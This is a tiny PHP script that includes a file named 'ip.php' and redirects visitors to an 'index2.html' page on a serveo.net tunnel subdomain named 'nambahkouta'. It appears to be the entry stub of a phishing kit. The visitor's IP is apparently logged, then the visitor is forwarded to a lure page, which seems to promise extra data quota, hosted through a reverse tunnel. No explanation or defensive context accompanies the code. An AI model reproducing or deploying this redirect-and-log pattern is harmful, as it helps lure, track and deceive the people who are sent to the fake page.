<?php
include 'ip.php';
header('Location: https://nambahkouta.serveo.net/index2.html');
exit
?>
